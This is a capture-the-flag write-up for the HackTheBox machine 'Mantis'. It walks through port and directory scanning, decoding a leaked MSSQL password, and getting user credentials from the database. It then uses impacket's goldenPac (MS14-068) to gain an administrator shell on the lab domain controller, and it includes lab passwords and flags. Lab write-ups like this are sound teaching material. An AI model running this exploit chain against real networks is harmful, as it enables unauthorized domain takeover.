---
title: "Mantis"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
  - Windows
tags:
  - HackTheBox
  - Active Directory
---

# Mantis

![](assets/Pasted%20image%2020250510154828.png)
<!-- more -->

## Enumeration

```bash
$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.10.52  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 18:13 CET
Nmap scan report for 10.10.10.52
Host is up (0.042s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-22 17:13:57Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-22T16:17:14
|_Not valid after:  2054-11-22T16:17:14
| ms-sql-ntlm-info: 
|   10.10.10.52:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
|_ssl-date: 2024-11-22T17:15:02+00:00; 0s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
|_http-open-proxy: Proxy might be redirecting requests
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
49173/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.52:50255: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-22T16:17:14
|_Not valid after:  2054-11-22T16:17:14
|_ssl-date: 2024-11-22T17:15:02+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.10.10.52:50255: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: mean: 42m51s, deviation: 1h53m24s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2024-11-22T12:14:56-05:00
| smb2-time: 
|   date: 2024-11-22T17:14:53
|_  start_date: 2024-11-22T16:17:04

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.74 seconds
```

We can't enumerate anything AD related, so I'll enumerate web directories in the two webs, `8080` and `1337`, and we get two results in `1337`.

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.52:1337/ -t 70 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.52:1337/
[+] Method:                  GET
[+] Threads:                 70
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/orchard              (Status: 500) [Size: 3026]
/secure_notes         (Status: 301) [Size: 160] [--> http://10.10.10.52:1337/secure_notes/]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```

Going to `secure_notes`, we have

![](assets/Pasted%20image%2020241122224807.png)

- This part of the txt file looks like a hash or something: `NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx`
- user: `admin` and database: `orcharddb`

Using `xxd`, we can convert hex to binary after base64 decoding it

```bash
$ echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
m$$ql_S@_P@ssW0rd!
```

So we have `admin:m$$ql_S@_P@ssW0rd!`

We connect to the database with `dbeaver`

![](assets/Pasted%20image%2020241122231825.png)

And we get credentials for `james:J@m3s_P@ssW0rd!`

There are no more users apart from admin and no useful shares

```bash
$ rpcclient -U "james" 10.10.10.52  
Password for [WORKGROUP\james]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[james] rid:[0x44f]
```

## Initial Access

So we try `goldenPac` from `impacket`:

Add the domain and DC to `/etc/hosts` and using `impacket-goldenPac` we can enter as administrator.

```bash
$ impacket-goldenPac htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local -dc-ip 10.10.10.52
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller 10.10.10.52
[*] 10.10.10.52 found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file qxzsvpAp.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service VXop on mantis.htb.local.....
[*] Starting service VXop.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```

## Post Exploitation

Get the flags

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
33427d458052f593baf71c6fdd9881d2
C:\Windows\system32>type C:\Users\james\Desktop\user.txt
4e6c5d2a9d462a4abcaa01f16f9a9c41
```

